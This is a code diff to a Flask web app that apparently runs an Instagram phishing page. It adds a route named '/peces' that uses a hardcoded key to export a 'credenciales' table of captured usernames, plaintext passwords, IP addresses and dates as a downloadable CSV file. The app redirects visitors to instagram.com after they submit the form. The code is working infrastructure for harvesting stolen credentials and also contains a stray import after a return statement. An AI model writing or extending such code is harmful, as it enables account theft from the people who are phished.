@@ -1,6 +1,8 @@
-from flask import Flask, request, render_template, redirect
+from flask import Flask, request, render_template, redirect, Response, abort
 from datetime import datetime
 import psycopg2
+import csv
+import io
 import os
 
 app = Flask(__name__)
@@ -47,6 +49,38 @@ def index():
         return redirect("https://www.instagram.com")
 
     return render_template("form.html")
+    from flask import Response
+
+@app.route('/peces')
+def descargar_csv():
+    clave = request.args.get('clave')
+
+    if clave != 'Badc41lluPass%':
+        return abort(403, description="Acceso denegado")
+
+    try:
+        conn = psycopg2.connect(DATABASE_URL)
+        cur = conn.cursor()
+
+        cur.execute("SELECT id, username, password, ip, fecha FROM credenciales")
+        datos = cur.fetchall()
+
+        output = io.StringIO()
+        writer = csv.writer(output)
+        writer.writerow(['ID', 'Usuario', 'Contraseña', 'IP', 'Fecha'])
+        writer.writerows(datos)
+
+        cur.close()
+        conn.close()
+
+        return Response(
+            output.getvalue(),
+            mimetype='text/csv',
+            headers={"Content-Disposition": "attachment;filename=credenciales.csv"}
+        )
+    except Exception as e:
+        return f"Error al exportar datos: {e}", 500
+
 
 if __name__ == '__main__':
     import os
